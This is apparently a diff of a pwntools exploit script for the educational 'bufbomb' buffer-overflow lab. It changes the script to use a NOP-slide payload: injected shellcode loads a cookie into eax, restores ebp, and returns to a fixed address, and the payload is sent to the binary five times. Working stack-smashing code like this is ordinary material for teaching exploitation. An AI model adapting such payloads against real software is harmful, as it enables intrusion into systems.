@@ -6,18 +6,21 @@ f.close()
 
 sh = process(['./bufbomb', '-u', id, '-n'])
 
+length = 512
 ebp = 0x556834a0
-ebpp = 0x556834d0
 ret = 0x08048e15
 cookie = 0x274adc8a
-offsets = [0, -112, 64, 48, -64]
+distance = 0x28 # distance from esp to previous ebp
+nop = chr(0x90)
 
-for offset in offsets:
-    shellcode = asm('mov eax, ' + str(cookie) + '; mov ebp, ' + str(ebpp - offset) + '; push ' + str(ret) + '; ret;')
+shellcode = asm('mov eax, ' + str(cookie) + '; lea ebp, [esp + ' + str(distance) + ']; push ' + str(ret) + '; ret;')
 
-    exploit = flat([shellcode.ljust(520, 'a'), ebp - offset, ebp - offset - 520])
+exploit = flat([shellcode.rjust(length + 8, nop), 0xdeadbeef, ebp - length / 2]) # NOP slide
+
+print ' '.join(char.encode("hex") for char in exploit)
+
+for _ in range(5):
     sh.sendline(exploit)
-    
     print sh.recv()
 
 sh.interactive()
